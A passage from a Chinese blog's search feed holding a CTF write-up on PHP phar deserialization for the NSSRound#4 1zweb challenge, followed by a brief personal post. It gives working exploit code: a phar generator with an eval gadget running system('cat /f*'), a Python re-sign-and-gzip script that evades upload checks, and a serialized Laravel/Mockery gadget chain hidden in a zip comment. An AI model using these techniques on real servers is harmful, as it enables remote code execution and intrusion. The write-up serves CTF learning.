class="hljs-number">004</span>=00C=00A=00A=00A=00A=00R=<span class="hljs-number">000</span>=00J=00N=<span class="hljs-number">00Q</span>=00g=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span><br></code></pre></td></tr></table></figure><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070053918.png" alt="image-20230817070053918"></p><p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt</code></p><p>注意要选上重写文件</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070203472.png" alt="image-20230817070203472"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070414298.png" alt="image-20230817070414298"></p><p><code>phar://log/error.txt</code></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070449179.png" alt="image-20230817070449179"></p><h2 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h2><p>可以非预期，我们这里按预期解来讲</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817071725768.png" alt="image-20230817071725768"></p><p><code>index.php</code>  源代码中查看完整代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>upload.php </code>源代码中查看完整代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传异常&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)))&#123;<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$pos</span>)===<span class="hljs-string">&quot;integer&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ltj一眼就发现了phar&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在&quot;</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;w&quot;</span>);<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$content</span>);<br>                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传成功 ./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>            &#125;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="hljs-variable">$extension</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p><code>upload.php</code>检查上传文件的后缀，检查文件内容，检查文件是否存在</p><p><code>index.php</code>绕过<code>__wakeup</code>即可</p><h3 id="对phar文件的处理"><a href="#对phar文件的处理" class="headerlink" title="对phar文件的处理"></a>对phar文件的处理</h3><ul><li>修改后缀      <code>a.phar -&gt; a.png</code></li><li>使用gzip对文件进行压缩，从而绕过对<code>__HALT_COMPILER();</code>的检查</li><li>php&#x2F;5.5.38 绕过<code>__wakeup</code> 修改类数字大于成员个数</li></ul><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Misc&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Re&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoveNss</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd = <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>$a-&gt;cmd = &#39;system(&quot;cat /f*&quot;);&#39;;</code>记得加<code>;</code>号</p><p>修改后缀    <code>a.phar-&gt;a.png</code></p><p>修改个数</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/b5d0c4afd2.jpg" alt="NSSIMAGE"></p><p>改完后重新签名并进行压缩</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1<br>import gzip<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()<br>s = f[:<span class="hljs-number">-28</span>]  <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[<span class="hljs-number">-8</span>:]  <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>new_file = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br>f_gzip = gzip.GzipFile(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f_gzip.<span class="hljs-built_in">write</span>(new_file)<br>f_gzip.<span class="hljs-built_in">close</span>()<br></code></pre></td></tr></table></figure><p>然后上传文件</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073309229.png" alt="image-20230817073309229"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073336340.png" alt="image-20230817073336340"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073419227.png" alt="image-20230817073419227"></p><h2 id="小说一下绕过-HALT-COMPILER-的检查"><a href="#小说一下绕过-HALT-COMPILER-的检查" class="headerlink" title="小说一下绕过__HALT_COMPILER();?&gt;的检查"></a>小说一下绕过__HALT_COMPILER();?&gt;的检查</h2><p>1.将phar文件进行gzip压缩后在修改为png文件后缀</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">import</span> gzip<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read()<br>s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取要签名的数据</span><br>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取签名类型以及GBMB标识</span><br>new_file = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br>f_gzip = gzip.GzipFile(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)<br>f_gzip.write(new_file)<br>f_gzip.close()<br></code></pre></td></tr></table></figure><hr><p>2.将phar的内容写进压缩包注释中，然后压缩为zip也会绕过该正则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$phar_file</span>;<br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-string">&#x27;O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:&#123;S:6:&quot;events&quot;;O:25:&quot;Illuminate\Bus\Dispatcher&quot;:1:&#123;S:13:&quot;queueResolver&quot;;a:2:&#123;i:0;O:25:&quot;Mockery\Loader\EvalLoader&quot;:0:&#123;&#125;i:1;S:4:&quot;load&quot;;&#125;&#125;S:5:&quot;event&quot;;O:38:&quot;Illuminate\Broadcasting\BroadcastEvent&quot;:1:&#123;S:10:&quot;connection&quot;;O:32:&quot;Mockery\Generator\MockDefinition&quot;:2:&#123;S:6:&quot;config&quot;;O:35:&quot;Mockery\Generator\MockConfiguration&quot;:1:&#123;S:4:&quot;name&quot;;S:6:&quot;crispr&quot;;&#125;S:4:&quot;code&quot;;S:31:&quot;\3c\3f\70\68\70 echo system(&quot;cat /flag&quot;);&quot;;&#125;&#125;&#125;&#x27;</span>;<br><br>    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>); <br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);<br>    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br></code></pre></td></tr></table></figure><h2 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h2><p>唉，啥都不会，自己还懒</p><p>这篇发完后又得过一段时间才能写下一篇了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>新征程</title>
    <link href="/2023/07/31/%E6%96%B0%E5%BE%81%E7%A8%8B/"/>
    <url>/2023/07/31/%E6%96%B0%E5%BE%81%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="新起点，勇往直前"><a href="#新起点，勇往直前" class="headerlink" title="新起点，勇往直前"></a>新起点，勇往直前</h2><p>从搭建好自己的博客开始，作为新起点，记录自己的刷题</p><p>本来是不喜欢写文章的，但发现要记录的有很多，便开始搭博客</p><p>要比过去认真刷题，遇到题目多做，不要只看别人WP就认为自己会了，我可是深受其害。</p><p>就这样吧<img src="/%E6%96%B0%E5%BE%81%E7%A8%8B/fluid.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
